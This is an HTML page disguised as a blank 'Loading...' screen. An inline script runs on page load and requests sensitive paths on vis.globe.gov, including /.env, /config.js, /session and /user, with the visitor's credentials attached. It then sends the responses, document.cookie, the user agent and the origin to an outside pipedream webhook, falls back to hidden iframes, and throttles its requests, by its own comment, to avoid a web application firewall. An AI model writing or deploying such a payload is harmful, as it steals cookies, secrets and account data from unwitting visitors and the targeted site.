<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
  <meta charset="UTF-8">
  <style>
    body { background: #000; color: #0f0; font-family: monospace; }
    h1 { display: none; } /* Hidden UI */
  </style>
</head>
<body>
  <h1>Loading...</h1>

  <script>
    (async () => {
      const webhook = "https://eojzzzf3qvc4t0o.m.pipedream.net";
      const base = "https://vis.globe.gov";
      const paths = [
        "/app/js/VISmain.js",
        "/app/js/framework/frameworkService.js",
        "/app/js/observer/observerService.js",
        "/app/js/app.js",
        "/.env",
        "/config.js",
        "/data.json",
        "/session",
        "/dashboard",
        "/user"
      ];

      const send = async (info) => {
        try {
          await fetch(webhook, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(info)
          });
        } catch (e) {
          console.warn("Webhook send failed:", e.message);
        }
      };

      const exfiltrate = async (path) => {
        const fullUrl = base + path;
        try {
          const res = await fetch(fullUrl, {
            method: "GET",
            mode: "cors",
            credentials: "include"
          });

          const contentType = res.headers.get("content-type") || "";
          let content = "[Non-text content]";
          if (contentType.includes("application/json")) {
            content = await res.json();
          } else if (contentType.includes("text") || contentType.includes("javascript") || contentType.includes("html")) {
            content = await res.text();
          }

          await send({
            type: "fetch",
            path,
            status: res.status,
            content: content.slice(0, 1500),
            userAgent: navigator.userAgent,
            cookie: document.cookie,
            origin: location.origin,
            referrer: document.referrer
          });

        } catch (err) {
          await send({
            type: "fetch-error",
            path,
            error: err.message,
            userAgent: navigator.userAgent,
            origin: location.origin
          });
          await fallbackIframe(path);
        }
      };

      const fallbackIframe = async (path) => {
        const iframe = document.createElement("iframe");
        iframe.src = base + path;
        iframe.style = "display:none";
        document.body.appendChild(iframe);

        await send({
          type: "iframe",
          path,
          note: "iframe fallback loaded",
          origin: location.origin
        });
      };

      for (const path of paths) {
        await exfiltrate(path);
        await new Promise(r => setTimeout(r, 1000)); // Throttle to avoid WAF
      }

      await send({ type: "done", timestamp: new Date().toISOString() });
    })();
  </script>
</body>
</html>
